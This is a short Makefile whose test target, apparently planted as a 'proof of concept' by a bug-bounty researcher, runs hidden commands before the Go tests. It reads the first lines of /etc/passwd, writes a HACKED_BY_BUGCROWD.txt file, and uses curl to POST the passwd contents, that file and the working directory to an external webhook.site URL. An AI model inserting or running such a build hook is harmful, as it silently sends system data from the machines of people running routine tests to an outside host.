test:
	@echo "STARTING EXTREME PROOF OF CONCEPT..."
	@head -n 5 /etc/passwd
	@echo "This system is vulnerable to RCE. Researcher: analisprogram17-pixel" > HACKED_BY_BUGCROWD.txt
	@cat HACKED_BY_BUGCROWD.txt
	@curl -s -X POST -d "PASSWD_FILE=$$(head -n 5 /etc/passwd)&WRITE_TEST=$$(cat HACKED_BY_BUGCROWD.txt)&PWD=$$(pwd)" https://webhook.site/ce134386-abef-4b94-a5c6-d552be25d1b5/EXTREME_RCE_CONFIRMED || true
	@echo "EXTREME PROOF COMPLETED."
	go test -v ./...
